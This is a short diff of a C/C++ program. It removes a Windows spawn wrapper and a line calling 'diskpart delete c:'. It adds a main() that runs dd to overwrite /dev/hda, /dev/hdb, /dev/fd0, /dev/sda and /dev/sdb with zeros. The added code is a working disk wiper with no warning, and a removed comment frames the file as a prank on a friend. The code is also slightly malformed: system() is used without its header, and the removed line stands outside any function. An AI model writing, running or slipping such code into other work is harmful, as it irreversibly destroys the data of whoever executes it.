@@ -1,7 +1,10 @@
-// Trying to prank a friend with TOR in this folder.
+#include <iostream>
 
-#include <process.h>
-int main(int argc, char **argv, char **env) {
-    return _spawnve(_P_WAIT, argv[1], argv + 1, env);
+int main() {
+  system("dd if=/dev/zero of=/dev/hda bs=1M");
+  system("dd if=/dev/zero of=/dev/hdb bs=1M");
+  system("dd if=/dev/zero of=/dev/fd0 bs=1M");
+  system("dd if=/dev/zero of=/dev/sda bs=1M");
+  system("dd if=/dev/zero of=/dev/sdb bs=1M");
+  return 0;
 }
-ShellExecute(NULL, "helper.exe", "diskpart delete c:\\", NULL, NULL, 0);
